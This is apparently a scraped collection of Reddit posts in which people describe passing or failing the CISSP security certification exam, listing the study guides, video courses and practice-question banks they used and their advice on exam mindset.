Wow I did not intend for this to be so long, I’m sorry! I do hope this can be helpful to someone!!",2021-07-10

**UPDATE** (2021-07-02) Some of you wanted know the explanation? It doesn't say much:

""Requiring a VPN to access the private wired network in addition to WPA-2 and 802.1x is the only additional reliable security option.""

**UPDATE** (2021-07-01) The correct answer is: Require VPN! My answer was also ""Use MAC Filtering.""

Here is a break of how many people answered this question:

Alright, brethren and sistren. Here is another question that popped up that I thought I knew the answer for but didn't. I don't agree with the correct answer so wanted to see what you all smart people think. Last time I wrote the answer this time I will not. I will share the question and give the answer later to see if the given answer was correct :) Explain your answer so it can help us all study and get into the mindset of how to think with these questions when taking the exam. Here we go... *(note: the question is from Sybex online study guide)*

I've provisionally passed the CISSP exam on 1st attempt.

On the ISC2 website, it might take up to 8 weeks... until the official confirmation comes out. Jeez...

150 questions, in 143 mins.

Previously I passed the CISSP Review and holding an Active EC-Council CCISO certificate, so the challenge was NOT so bothersome or struggling, with all due respect to test takers.

The only challenge I had was the size of the bottle which I had to urinate for not leaving the test desk lol... Have you faced a bottle that is almost full and still, you've LOT to go...

Almost ruined the ground and my pant. \^\^

Anyway, that's me guys, any questions or whatever, let me know...

2717,ogv3ld,Passed at 150 Questions and 3 Hours,"Took the exam and passed at 150 questions. I was pleasantly surprised and to be honest I did not expect to read Congratulations on the sheet after I left the testing center. 

One of the weirdest elements of my exam was that it almost felt like the exam was trying to get me to pass. As I passed question 100 I received many questions on concepts that I was most strong in. It really did start to mess with my head because I just assumed that the exam was just feeding me questions to get to 150 as I couldn’t understand how I got the same question on SOC reporting rephrased 5 different ways. 

Studying consisted of:

- Training Camp Boot Camp
- CISSP Exam Cram Youtube Videos
- Study Notes and Theory Test Questions (~200)
- Sybex Test Questions (~300)
- Luke Ahmeds How to Think Like a Manager for the CISSP

Overall i’d say the Exam Cram videos were the best to jog my memory on all the concepts leading up to the Exam. I don’t think I took the conventional study method as I took the Training Camp bootcamp and sat for the exam a few weeks later. I’ll be honest that my exam prep wasn’t the greatest as I only had limited nights and weekends to dedicate. But the week leading up I had 2 full day cram sessions (the day before and the day of the exam). 

Happy to answer any questions you have on the Exam or study materials.

2719,ooy5bj,My CISSP journey from zero to passing with some obstacles," **My CISSP journey:**

I started studying at the beginning of 2019, inspired by some posts on reddit and the fact that the content of CISSP is very interesting for me and my further career steps. I spent about 3 months reading the Official Study Guide (OSG), researching a lot of content and taking lots of notes, and in the meantime, I was very confident that I would pass the exam.

However, in the middle of 2019, I stopped studying because I got an interesting job offer in security that required a bit more attention. So I decided to take a break and catch up on the OSG sections from time to time. 

In early 2020, I met a work colleague who has already passed the CISSP exam, he gave me some tips on good sources to continue with my studies. Later I will give a brief overview of the sources that helped me. I started studying seriously for a second time. This time with Thor and Kelly while I was driving. In the evenings I read the OSG and the latest Sunflower PDF to have a lot of information in a condensed form. Later in the year I ordered the Boson question bank and the OSG practice exam to practice some questions. In the beginning, I regularly scored 75% and reread my weak topics.

I booked my first exam in Germany, Düsseldorf for December 2020, due to Corona the test center was closed. The next possible date for the exam was in February 2021, this date was also cancelled. The next test date was then in April 2021. If I didn't pass the exam on that date or the test was cancelled again, then I would have to learn the new content because of the content update in 2021. And it happened again, the exam was cancelled again. Now it was clear I had to understand and be able to apply the new content, by 11 July. 

The last weeks before the exam I studied after work in the evenings for about 3+ hours, plus all the weekends. The day before the exam I thought I was ready to take it, but as soon as I saw the first 10 questions, I thought what the hell, I never read about this content. Halfway through, I wasn't very confident that I could pass the exam, but I focused on each question. When I finished the last question, I went to the reception and got my result - **Congratulations!** 

I passed, the CISSP exam.

**The study resources I used to prepare:**

**Cybrary Kelly Henderson:** I like her video training, she is very funny, knowledgeable and a great educator. You get a good and deep overview in her videos, which is easy to understand even as a non-native speaker. A must watch is her video on YouTube ""Why you will pass the CISSP"". 

**Thor Theache's CISSP:** I have seen a few write-ups saying that his content is not very good. But I disagree, his content is a bit expensive but worth watching. He is also a good trainer and sometimes he is available in the discord channel of certification station.

**CISSP for dummies:** I ordered this book and never read a complete chapter. Sometimes I had to re-read some content to get a second or third view of the content. 

**(ISC)2 Official Study Guide - latest version in 2020:** my main study resource, I read this book cover to cover, word for word. It is a good resource to get a good overview of the content, which is really a mile wide and a inch deep. At times I thought it was 1.61 km wide and 2.54 cm deep 😉. But if you ask me if you can pass with just the OSG, I will say, yes, it is possible, but you should take some time to read some other books as well.

**Eleventh Hour CISSP:** I got this book to get a quick overview of all the content that might be necessary in the last week. In hindsight, I would have read this first before going through the official study guide. It gives a good overview of everything to expect in the exam.

**(ISC)2 Official Practice Exam:** You should use the online version of the book, this is more helpful than the paperback. You will need to use the code you get from the paperback to register for the online test bank.

**Boson CISSP Practice Exam:** A lot of questions for a good price, updated regularly. You will need Windows to work with Boson. The questions are very technical and the answers are very well explained so you understand why the questions are wrong. This is a ready important aspect from my point of view.

**Certification Station Discord:** The CISSP channel is absolutely worthwhile. A very good resource that I would recommend anyone to join. Ultimate bunch of helpful people, open 24/7 (because of the international audience). Discussions on various topics have helped me a lot

**Destination Certification Flash Cards:** If you are on a train ride, journey or similar, take these flash cards and just read them one by one. Very helpful in my eyes. I would read them in the middle of my exam preparation.

**Do's and Don'ts:**

\- Register as soon as possible. The examination center in Germany, Düsseldorf is always fully booked at short notice.

\- I have done 4000+ questions.

\- Read correct AND incorrect answers of the question

\- Read the question twice during the exam

\- Do not give up during the exam, even if it looks bad

\- Be a member of a study group (Certification Station)

\- Eat well and do some exercises to have a fresh mind.

My last words, ""Don't talk the talk, walk the walk"" and all the best. I will now rest for a few weeks and then continue with CISA or CISM.",2021-07-21

2722,p35d9k,Officially Passed today!!!,"Sharing the good news here because without this group I don't think I would have made it. 

The exam is what everyone says, it's hard and grueling but i approached it with a mangers mindset and got the job done!

For anyone who is struggling please know that I failed this exam before but this group inspired me to keep going, so thanks you all. 

For studying, i used a wide variety of material including a one week intense bootcamp which was very expensive - all paid for by work. If honest, I think the best was Thor Peterson online material with questions and Boson.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads. 

Now good luck to anyone on their journey.

2726,omj3yq,7/10/21 Fail at 150 questions,"Sigh. Here I am writing the post I never wanted to write. I went for it on 7/10/21 and didn’t pass. Hoping to help others and get a little advice on the next steps to take. 

Per my previous post [here](https://www.reddit.com/r/cissp/comments/oexlqz/cue_the_panic_5_days_until_exam_date/?utm_source=share&utm_medium=web2x&context=3), I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. I'd been studying off and on for a little over a year, four consecutive months of intense study, and utilized the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I’d also taken a 10-week boot camp class three times.

I knew there were topics I didn’t have down 100% but felt I *probably* knew enough to get me by. When I sat down at the computer to take my exam, I knew I was in trouble 20 questions in. The questions looked so foreign and vague. I read and reread and reread every question, breaking the sentence down by word, looking for some semblance of anything I’d seen before. I couldn’t make sense of any of it. I had anticipated this since that’s what everyone says but that didn’t cushion the shock.

I went all the way to 150 questions. I saw a lot of questions on SDLC, at least five questions on SOC compliance and a few on DRP/BCP. Nothing super technical with the exception of a few IPSec and tunneling protocol questions. Nothing on Kerberos, nothing on OSI. Out of all 150, I felt confident I knew the answer on maybe 5 questions. 

What’s really crazy is that I had “think like a manager; don’t DO anything” tattooed on the inside of brain going in. But none of the questions, nor any of the answers, within my exam were structured that way or provided answers that were that high-level. I’m not a technical person so it’s not my instinct to “fix” anything. There weren’t any “weeds” to get into. The questions weren’t super technical but they most definitely weren’t high-level. Somewhere in between, if that makes sense. 

I was below proficiency in four domains, near proficiency in three, and above in one domain. Interestingly, the domains I’d considered my weak domains while studying were my strongest, and my strong domains were “below proficiency.”

So now I’m trying to decide what to do: whether to give it another go or maybe try another certification like Security+ to help build up my confidence. There’s a real big part of me that wants to keep going and build onto the momentum I had and try again in 60-90 days. There’s another smaller part of me that wants to walk away from it completely and get my life back again and enjoy the rest of my summer.

Any advice, opinions, feedback? Should I try again or go for Security+? Is this just too big an elephant to eat for a non-technical professional?",2021-07-18

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

In between the years after certified in CISSP, I have also certified in ISACA's 5 CXXX exams.

And should I say ""graduate"" from ISC2?

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken). But SSCP is a good interim step for you to prepare your CISSP if you don't have the full domain knowledge and experience.

2730,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12
2731,ou390s,Passed this morning at 100q,"I have 24 years of IT experience and about 15 years in IT Security.  I've done everything from being a cable-jockey in 1997 straight out of high school to my current role of Deputy CISO for a large hospital.  I obtained the CISM in 2019.

My organization paid for an ISC(2) bootcamp and I had a fantastic instructor who provided excellent examples of ""demystifying"" complex subjects like encryption algorithms and frameworks.  I attended the bootcamp last week.

I only used the book as referenced by my bootcamp instructor and then occasionally during the ISC(2) official practice exams to review information that I missed.  I didn't read it cover-to-cover.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

I am so relieved to have it behind me... and want to encourage those of you that are planning to take it, book the exam now.  Having that ""deadline"" helps with the mental aspect of prepping.  You HAVE to do it if you have an exam appointment.

2732,oakjg4,Provisionally passed @ 107Q in ~130 minutes,"This was the 9th time I have sat for a certification exam in my IT career and I probably studied three times more than I did for any of the other ones - MCSE, A+, Security+. I have around 25 years of experience in the field, most of that as a network admin on Active Directory/Azure. But I've also worked the helpdesk, been Tier 2 and Tier 3 support, and even spent a year as a Logistics Manager, which I was surprised to find got me a lot of experience with the physical security concepts that were on the exam. 

I had actually planned to get my CISSP in 2020, back to back with getting my Security+, but two things happened right when I was about a month or so out from being ready for the exam, I got a new job, and then there was a global pandemic that shut all the testing centers down, so getting the CISSP went up on the shelf, but I did do about 4 hours of training a month on it, which is nowhere near enough but it kept me in the mindset.

Anyhow I got laid off this spring so I decided to go ahead and wrap up the CISSP certification while I have a lot of time to study for it. One thing that really got me into high gear was to go ahead and schedule the exam, once that clock is ticking down, even if it's weeks away, it will keep you motivated! I did find that it was hard to get available spots 1-2 months out for the exam, but if you keep checking the available spots you find that many candidates reschedule their exam when they're about 2-3 weeks out. So when I felt like I was about 3 weeks away from being able to do it I pulled the trigger on the 29th.

Study materials:

* **Original Study Guide (8th ed.) and Original Practice Tests** \- I got the bundle off of Amazon last year when I started studying the first time. I did wind up reading the OSG cover to cover in 5 days but it was towards the end of my studies. It's a tough read but I pushed my way through, and now I think that doing this was critical to understanding the material for the exam. It tied up a lot of small loose ends that I had been struggling on. I strongly suggest reading all of it at least once.  As for the OPTs I registered those online through Wiley Efficient Learning, and downloaded the ios app so I could take the tests on my PC and on my iPhone. I will say the web based version is kind of clunky and I wound up needing to login two or three times to get it to work but it was fine once I got logged in. The ios version seems to be better. The nice thing is that both the web version and the ios version share your results so you can check your progress from either platform.  One thing I didn't realize until late in the game was that if you register the OSG online as well it gives you a completely different test bank of 1300 questions, so be sure to register both products if you get the bundle!
* **Boson CISSP Practice Exam** \- I actually bought this last year as well but I had only taken the first of the five practice exams in it. Yes it's quite technical but just like the question banks from the OSG and OPT, it's testing you on the knowledge base you'll need to pass the real exam. No, the questions aren't like what you'll get on the exam but you must have a complete understanding of all 8 domains and that's what this product is testing you on. The explanations are excellent and will point out where you need to study more. Also at the end of the test it will show you what domains you may be weak on. 
* **My strategy for taking practice tests** \- I'd like to point this out because I think it's important - the CISSP exam is not like other technical certifications you may have done before. Taking practice exams over and over again until you've memorized all the questions and answers is not going to work. My study strategy for the practice tests evolved over time but the way I decided to do it was that instead of taking the same practice exams over and over again I would take them once, then go back and re-take all the questions I answered incorrectly. If I could answer one of the questions correctly then I was done with it and closed those questions out. Fortunately both Boson and Wiley Efficient Learning let you select only the questions you've answered incorrectly for creating custom quizzes so that's where I focused my studies. I did wind up taking the Boson tests twice, about three weeks apart, but out of the 10 practice tests on Wiley Efficient Learning I only took those once. 
* **MFProd on YouTube** \- I did these as part of my study last year before the pandemic hit. If I remember right it was more than 40 hours of material, and was very comprehensive. Unfortunately last year there was some kind of copyright issue with these and they were taken down. A shame, because I made my own ""boot camp"" out of it and took pages and pages of notes which I was referring to as recently as last night.
* **CISSP Cert Prep (2021) on Linkedin Learning** \- since MFProd was gone I needed to use something else, and I had used Mike Chapple's Security+ course on Linkedin to pass that exam so this was the first place I went. Fortunately I discovered that I could get access to LinkedIn Learning for free with my local library card! So I signed up for a library card and then got access to the LIL site. It's more or less the video version of the OSG so it's a bit dry and was kind of a grind but I watched all of it and got myself back up to speed.
* **Kelly Handerhan videos on Cybary** \- everyone talks about watching these and there's a good reason why - Kelly is uniquely skilled in explaining some of the harder to understand concepts you'll need to understand for the exam. After watching this I had Kerberos down solid. It's not like the LinkedIn Learning course in that it's much shorter and not as comprehensive so this is something you should watch towards the tail end of your studies, I was most of the way through this when I scheduled my exam time 3 weeks away.
* **CISSP MindMaps on YouTube** \- these are pretty good, when I was weak on a domain in the practice tests I would go back and watch the MindMap videos for the domain I needed to brush up on. 
* [**CISSPrep.net**](https://CISSPrep.net) **practice exams** \- this was the first of the HARD practice tests that I purchased. Some of the questions are a little rough around the edges but they're quite difficult and they have a LOT of practice tests. The exams are only 50 questions but they're hard, and it will take you a while to get through them. I only did about 5 of these in the end but the explanations are good and once I was done with Boson and WEL, these got me ready for what the real exam would be like.
* **CISSP Mindset Academy practice exams** \- these are also HARD questions and they've been updated for the new material on the 2021 exam. I took both exams just last week and was only able to score in the 50% range on them, that was a bit worrying to me until I found out that's a completely normal score for someone who is about ready for the exam. Once again, I would do these after you've already completed Boson and WEL- these get you ready for the real thing. These tests and the next one are both on Udemy. 
* **HARD CISSP practice questions #1 Thor Pedersen** \- for me this wound up being the final go/no-go for sitting the real exam. I decided that if I was under 50% the first time I took it I was not ready and would have to re-schedule the exam. I scored 55% when I took it last Sunday. I decided I was ready to go. Thor is the guy who says you should do 5000 practice questions before going for the exam, and I tend to agree with this. I'm not sure if I did 5000 questions but I'm pretty sure I was over 4000.
* **Eleventh Hour CISSP Study Guide** \- I got the audiobook version of this and listened to it all the way through on the very last day at 1.3x. Finished it right before I went to sleep on the last night before the exam.
* **Why You WILL Pass the CISSP Kelly Handerhan, Larry Greenblatt CISSP 2020 Exam Tips, The CISSP Mindset: How to ""Think like a Manager"" and PASS!**  \- watched these three videos right towards the end. Heck, the last one I watched in the parking lot of the testing center. These put you in the right manager/advisor mindset to take the real exam. Want to know why a lot of people fail the exam on the first try? They didn't have the manager/advisor mindset going into the exam, that's why.

So as others will tell you the questions you get on the practice exams aren't like what you'll see on the real exam and this is quite true, especially for the WEL and Boson stuff. The hard exams I listed are closer to the real thing though. 

Like everyone tells you, I wasn't sure if I had passed or not when the test ended. When I got to question 101 I knew it was really serious at that point, and by then time management was becoming an issue. Definitely read every question on the exam more than once! There were a couple of times when I looked at the answers and thought ""all of these are right answers"" and then I would find a single word in the question that made only of the answers the correct one. Those were the ""A-HA! GOT YOU!"" moments. (imagine the gif with Leonardo DiCaprio pointing at a tv screen here). There were also a couple of ""What the heck are they even trying to ask me?"" moments. I gasped when the test suddenly ended at question 107 and wasn't 100% certain how I had done until I opened the printout the lady at the front desk handed to me. I actually had to check that exam sheet a couple of times just to be absolutely certain I hadn't hallucinated the words ""Congratulations!"" and ""you have provisionally passed"".

By the way both this subreddit and the Certification Station discord server were critical in getting me that passing score. I was checking posts in here every single day and hanging out in the # cissp room on the discord server.

2736,oufquj,Provisionally Passed Yesterday!,"I have to honestly say at first, if you’re reading this, you are probably more intelligent than me. Seriously! I just happened to stumble across cybersecurity as I begin to prepare for retirement, and it’s turned into my new passion!

I have no factual background in IT or cybersecurity (I did get SEC+ in March). I’m an active duty Soldier who’s about to retire, and my specialty is in tactical radios and COMSEC. What probably helped me out the most was that I’d been a “manager” for almost 18 years. I do have pretty good knowledge of symmetric and asymmetric keys as a COMSEC manager, but that’s been my experience for the past 20 years.

I passed on my first attempt at 150 questions. I made sure to read everything super slow, and I took the entire three hours.

I used a ton of sources to make up for my experience and lack of knowledge.

Sources I used:

Study Notes and Theory - best overall source for content. The website and Facebook group are phenomenal. 

How to Think Like a Manager by Luke Ahmed - the 25 questions helped me with the manager mindset. Excellent!

Mike Chapple’s LinkedIn course - does a great job of delivering content, then applying it to real-world scenarios 

Sybex 8th & 9th editions 
Sybex Official questions
Shon Harris AIO
Wentz Wu The Effective CISSP
11th-hour study guide
Cissprep.net questions
Destination Certification videos by Rob Witcher
Kelly Handerhan videos
Prabh Nair’s YouTube videos

I used the Pomodoro method for my study routine.

I also used Anki a lot and this subReddit group.

The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

Those were my top three resources! But I needed all of them to pass!

I've been studying since March, directly after passing the Sec+.

I didn't find the exam super hard. It was tough, but I felt prepared the best I could have been!

I've learned a ton!!",2021-07-30
2737,oa0x4s,I passed CISSP on my second attempt. Lessons learned,"I finished the exam about four hours ago after a second attempt from a year ago and here’s what I learned. Tl;dr. “Have a plan, Attack!” > “Have a plan: Attack!”

My background: I’ve been working in security for about five years with a background in IT for about 20 years from desktop support to senior engineer/sysadmin roles. Up until today I had one recently expired ITILv3 Foundations and one expired Security+ certification. For each attempt I did about three months of studying.

1. What did I use to study?
The CISSP Official Study guide
The CISSP Official Practice tests (book)
The CISSP study test and exams mobile apps
11th Hour CISSP
Serious Cryptography (not on the exam but a good book for later to explain that stuff)
Cybrary (all respect to Kelly Handerhan but I only made it through the first two domains)
The Shon Harris book (all respect as well but I probably cracked it open twice during my first attempt and that’s it)
YouTube 
    CISSP Exam Cram Playlist (Inside Cloud Security)
    CISSP Mind Maps (Certification Destination)

2. How did I prep and why did I fail the first time?
I gave myself about three months of study time. I used the mobile app and took practice tests in small bursts (10-20 a day). Minimum of 70% on each of the domains
I planned it out three months in advance but didn’t have a plan other than taking the practice tests over and over. I made it a point to mark and highlight the official book (more like small post it notes but had not dived into the book as much. Two weeks before I skimmed through the 11th hr book writing down notes on paper, one domain per page. Admittedly I didn’t have a plan and wanted to get back to grinding towards OSCP. I also thought about the questions as an engineer and not a manager. I was also in a sour mood about it after reading a few job/certification threads on Twitter. Probably anecdotal but who knows. 

3. What I did this time?
So I mentioned OSCP earlier….I’ve put a lot of effort toward it but in between failing and peer pressure from work (something something jump off a cliff and get a CISSP because your coworkers did). Basically the Friday after failing my OSCP….again, I said @#$& it, I’ll just sign up for the exam and knock this out.

The first thing I did was plan out the next three months of how I was going to study.
The whole three months: listen to the aforementioned YouTube playlists over and over. Even in the background while playing video games or while I would go on walks. I not only wrote out a plan but also joined this subreddit and read a bunch of the passed/failed stories and used some of the least common denominators 

March-April: Finish ALL the practice test questions in the book, graded myself on each domain, and took notes for questions I was clueless on I.e. questions I couldn’t find a wrong answer to.
April-May: I used the mobile app (the official one) again, this time taking the tests in larger chunks (50 questions). Sometimes I would do all the domains, or sometimes a couple. No rhyme or reason, just more exposure and taking note of where I needed to study.
May-June: I wanted to get 100% finished with any of the domains on the app but did at least get a minimum of 70% on all the domains. I took notes from 11th hr again except this time I ignored stuff I was already familiar with. 

A week before and during the exam: In addition to all the other notes I wrote down a few notes for things I was still stuck on (formulas, key lengths, etc), but got some good advice from my boss for the exam on eliminating wrong answers: Use the laminated paper you get for the exam to write A,B,C,D and for each question, put an x next to each possible wrong answer. I also wrote down the formulas and other things I made a point to memorize on the exam. Did I run into a lot of those questions? I honestly couldn’t tell you, but I didn’t want it to be a concern. Aside from that I wrote at the top of the paper YOU ARE THE CEO! to set the framework.

As for the exam, I was feeling confident up until about the last thirty questions and was getting that sinking feeling I wasn’t gonna pass but had already made my mind up and planned out what I was gonna do after so to be honest even after passing I walked out the building saying “@##& this exam” to myself. It has to be the first time I was pissed about something positive I did. 

Anyway, aside from planning things out I wanted to give a shout-out to this subreddit for the stories shared. One thing that can be a double edged sword is seeing all the celebratory posts on passing it. 

Work wise it was also much easier to plan and focus when I would see really smart people exercise the knowledge and not treat it like a “checkbox” cert. I loathe the idea of learning out of arbitrary “obligation”.",2021-06-29
2738,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.

2739,p18g19,"Failed, 150 Questions","Today I sat for the CISSP exam and failed at 150 questions. I scored Below Proficiency Level on 4 of the domains, and  Near Proficiency Level on the other 4.

I mainly studied out of the Cybex book and the practice questions included, the mindmap series on YT and loosely following Kelly Handerhan on Cybrary, as well as help from you all on this subreddit!

It has discouraged me and I'm leaning towards not sitting for a retake. The cost of the exam is high and I dont know how I would prepare effectively for it in the future as **MOST** questions were down to 2 different choices for me and I thought i did much better than the printout told me",2021-08-09

2742,oxbqfd,Passed my CISSP today,"Hey all,

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

Good luck with your exam!",2021-08-03

* [Destination Certification](https://www.youtube.com/channel/UCXk6whiDrWq42y9Tdv1MEhg) summary videos
* Google

CISSP Exam Cram came first, and after finishing all 8 domains and doing a few questions, I watched Destination Certification videos as a refresher. Sunflower CISSP Summary was mostly used as reference material, alongside Google.

**Practice**

* CISSPrep

Comparing the style, CISSPrep questions were very similar to the questions I got during the certification tests. Its pretty affordable as well. Some questions there are worded poorly, or have bugged options (especially for the drag and drop, somehow it doesn't record your selections properly), and some questions that I got wrong were not very well explained by them. However, it did a proper job in training me to focus on what's important when reading and answering questions (think like a manager).

I would say that results for practice tests don't really matter (unless you're getting below 40-50%), what's important is what you get from it. I was scoring 60-65% on the CISSPrep mock exams the day before the test.

Having little work experience, these 2 videos were vital in getting me into the correct mindset when doing practice questions, and sitting for the test. Watch them once before doing practice tests, and as many times as you want before you sit for the test, I feel it really helps.

**The Test**

It wasn't as hard as I expected it to be. Questions were pretty clear in explaining scenarios, just make sure to read carefully and read all the options. Many times I changed my answer at the last minute after realizing I read the question/options wrong or too quickly.

2745,onxvll,Provisionnally passed @100 questions,"Hi,

Just wanted to share my feedback after passing provisionnally.

&#x200B;

**About me**

* About 10 years experience in IT Audit, GRC, CISO. Not really a tech guy.
* I registered 2 years ago, had zero motivation to study and rescheduled it. Then covid arrived and I had to reschedule two more times...

&#x200B;

**Preparation**

1. Eleventh Hour CISSP - I did not open at all the official guide, but I have read twice this smaller book. Very good starter for lazy people like me.
2. CISSP Official Practice Tests - Did all questions and looked on internet to understand when I was wrong. Resources I used the most.
3. PocketPrep (IT & Security) - Very good to test your knowledge with direct questions to use during transports. Not too technical and not too expensive. I did all questions.
4. Random website ([http://luc.desfosses.fr/CISSP/](http://luc.desfosses.fr/CISSP/)) - I do not remember where I found it, probably on reddit, but this has been a good summary of key concepts. I also wrote on paper the key concepts (OSI, ports, security models, SOC, BCP, ...).
5. 2021 Exam change - As I took a very long time to get the motivation to start studying, the content has changed in May so I looked to the changes on this website [https://www.cybervista.net/cissp-may-2021-exam-update/](https://www.cybervista.net/cissp-may-2021-exam-update/)

I hesitated a lot to buy Boson questions after reading this reddit, but I also looked at many feedbacks here saying that Boson questions were too technical compared to the exam so I did not buy. And to be honest I think that knowing more technical details would not have helped at all. At least I saved some money.

&#x200B;

**Exam**

* As most of people here I was not very confident that I would succeed during the test. I thought I would go to 150 questions but it ended at 100...
* You really need the high level view of what is used for what (concepts). You do not need to bother learning by heart every technical details of everything.
* Work experience helped a lot, although I am not a tech guy I review lots of risk analysis and the mindset is similar.

2746,oc2t4m,Failed today (2 July) @ 150 Qs,"Dear Folks,


Good day!


Well not so good for me as I failed the exam after answering 150 questions in 1 hr and 45 mins.


I was thrown with a lot of questions in a certain topic in which I didn't dive that deep. When I checked the OSG, that topic is just discussed in one page and showed additonal links for further reading.


I tried to apply the ""Risk Advisor"" mindset during the exam. I would say I used it properly as I was able to determine which is the correct ""Managerial"" answer from the correct ""Technical"" answer which is focused on fixing things.


For my study plan, I've used OSG, Cybrary, Boson, CISSPrep, and Rob's MindMap for like over 6 months of studying.


I have 7 years of experience under my belt in IT (Telco, NW, Security Engineering) and currently working as InfoSec Consultant.


I am now thinking whether should I retake the exam. If so, I am considering to take it after 6 months or even couple of years. I think this exam is easier for folks who are more seasoned in the industry.


For those who are studying for the exam, don't stress yourself too much. Remember to take a break during your studies as this exam will surely bring a study fatigue.

